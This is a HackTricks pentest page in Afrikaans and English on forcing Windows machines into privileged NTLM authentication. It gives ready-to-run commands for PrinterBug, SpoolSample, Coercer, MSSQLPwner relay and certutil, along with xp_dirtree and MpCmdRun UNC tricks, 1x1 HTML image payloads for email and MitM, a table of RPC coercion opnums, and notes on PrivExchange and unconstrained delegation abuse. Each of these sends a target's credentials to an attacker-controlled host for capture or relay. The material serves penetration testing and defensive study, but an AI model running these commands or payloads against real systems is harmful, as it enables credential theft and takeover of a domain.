# Force NTLM Geprivilegieerde Verifikasie

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is 'n **versameling** van **remote authentication triggers** coded in C# using MIDL compiler vir die vermyding van 3rd party dependencies.

## Spooler Service Abuse

As die _**Print Spooler**_ service **geaktiveer is,** kan jy sommige reeds bekende AD credentials gebruik om by die Domain Controller se print server 'n **update** aan te vra oor nuwe print jobs en dit net vertel om die **notification na 'n ander system** te stuur.\
Let op dat wanneer die printer die notification na 'n arbitrêre system stuur, dit teen daardie **system** moet **authenticate**. Daarom kan 'n attacker die _**Print Spooler**_ service laat authenticate teen 'n arbitrêre system, en die service sal die **computer account gebruik** in hierdie authentication.

Onder die oppervlak misbruik die klassieke **PrinterBug** primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** oor **`\\PIPE\\spoolss`**. Die attacker open eers 'n printer/server handle en verskaf dan 'n vals client name in `pszLocalMachine`, sodat die target spooler 'n notification channel **terug na die attacker-controlled host** skep. Dit is hoekom die effek **outbound authentication coercion** eerder as direkte code execution is.\
As jy op soek is na **RCE/LPE** in die spooler self, kyk na [PrintNightmare](printnightmare.md). Hierdie page fokus op **coercion and relay**.

### Finding Windows Servers on the domain

Met PowerShell, kry 'n lys van Windows boxes. Servers is gewoonlik prioriteit, so kom ons fokus daar:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Vind Spooler-dienste wat luister

Gebruik 'n effens gewysigde @mysmartlogin se (Vincent Le Toux se) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), kyk of die Spooler Service luister:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Jy kan ook `rpcdump.py` op Linux gebruik en soek na die **MS-RPRN** protokol:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Of toets gashere vinnig vanaf Linux met **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
As jy **coercion-oppervlakke** wil **enumereer** eerder as om net te kyk of die spooler-endpoint bestaan, gebruik **Coercer scan mode**:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Dit is nuttig omdat die sien van die endpoint in EPM jou net vertel dat die print RPC interface geregistreer is. Dit **waarborg nie** dat elke coercion method met jou huidige privileges bereikbaar is of dat die host 'n bruikbare authentication flow sal uitstuur nie.

### Vra die service om teen 'n arbitrêre host te authenticate

Jy kan [SpoolSample van hier af](https://github.com/NotMedic/NetNTLMtoSilverTicket) compile.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
of gebruik [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) of [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) as jy op Linux is
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Met **Coercer** kan jy die spooler-koppelvlakke direk teiken en vermy om te raai watter RPC-metode blootgestel is:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forcing HTTP instead of SMB with WebClient

Classic PrinterBug lewer gewoonlik ’n **SMB**-verifikasie na `\\attacker\share`, wat steeds nuttig is vir **capture**, **relay to HTTP targets** of **relay where SMB signing is absent**.\
Maar in moderne omgewings word relaying **SMB to SMB** dikwels deur **SMB signing** geblokkeer, so operateurs verkies dikwels om eerder **HTTP/WebDAV**-verifikasie te forseer.

As die teiken die **WebClient**-diens laat loop, kan die listener in ’n formaat gespesifiseer word wat maak dat Windows **WebDAV over HTTP** gebruik:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Dit is veral nuttig wanneer dit met **`ntlmrelayx --adcs`** of ander HTTP relay targets gekombineer word, omdat dit vermy om op SMB relayability op die gedwonge verbinding te steun. Die belangrike voorbehoud is dat **WebClient moet loop** op die slagoffer vir die HTTP/WebDAV-variant om te werk.

### Combining with Unconstrained Delegation

As 'n aanvaller reeds 'n rekenaar met [Unconstrained Delegation](unconstrained-delegation.md) gekompromitteer het, kon die aanvaller **die printer laat authenticatie doen teen hierdie rekenaar**. Weens die unconstrained delegation sal die **TGT** van die **computer account van die printer** **in die memory** van die rekenaar met unconstrained delegation **gestoor word**. Aangesien die aanvaller reeds hierdie host gekompromitteer het, sal hy in staat wees om **hierdie ticket te haal** en dit te abuse ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.\
For spooler abuse, **MS-RPRN opnum 65** remains the most common and best-documented primitive because the protocol specification explicitly states that the server creates a notification channel back to the client specified by `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.

## PrivExchange

Die `PrivExchange` aanval is die resultaat van 'n flaw wat in die **Exchange Server `PushSubscription` feature** gevind is. Hierdie feature laat toe dat die Exchange server gedwing kan word deur enige domain user met 'n mailbox om te authenticatie na enige client-provided host oor HTTP.

By default, die **Exchange service run as SYSTEM** en kry buitensporige privileges (spesifiek, dit het **WriteDacl privileges op die domain pre-2019 Cumulative Update**). Hierdie flaw kan uitgebuit word om die **relaying van information na LDAP en daarna die domain NTDS database te extract** moontlik te maak. In gevalle waar relaying na LDAP nie possible is nie, kan hierdie flaw steeds gebruik word om te relay en te authenticatie na ander hosts binne die domain. Die suksesvolle exploitation van hierdie aanval gee onmiddellike access tot die Domain Admin met enige authenticated domain user account.

## Inside Windows

As jy reeds binne die Windows machine is, kan jy Windows dwing om met privileged accounts na 'n server te connect met:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Dit is moontlik om certutil.exe lolbin (Microsoft-ondertekende binary) te gebruik om NTLM-authentication af te dwing:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML-inspuiting

### Via e-pos

As jy die **e-posadres** ken van die gebruiker wat by ’n masjien aanmeld wat jy wil kompromitteer, kan jy eenvoudig vir hom ’n **e-pos met ’n 1x1-beeld** stuur soos
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
en wanneer hy dit oopmaak, sal hy probeer om te verifieer.

### MitM

As jy 'n MitM-aanval op 'n rekenaar kan uitvoer en HTML kan invoeg in 'n bladsy wat hy sal sien, kan jy probeer om 'n beeld soos die volgende in die bladsy in te voeg:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Ander maniere om NTLM-authentikasie te forseer en te phish


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

As jy [NTLMv1 challenges hier kan vasvang lees hier hoe om hulle te crack](../ntlm/index.html#ntlmv1-attack).\
_Onthou dat om NTLMv1 te crack jy die Responder challenge na "1122334455667788" moet stel_

## Verwysings
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
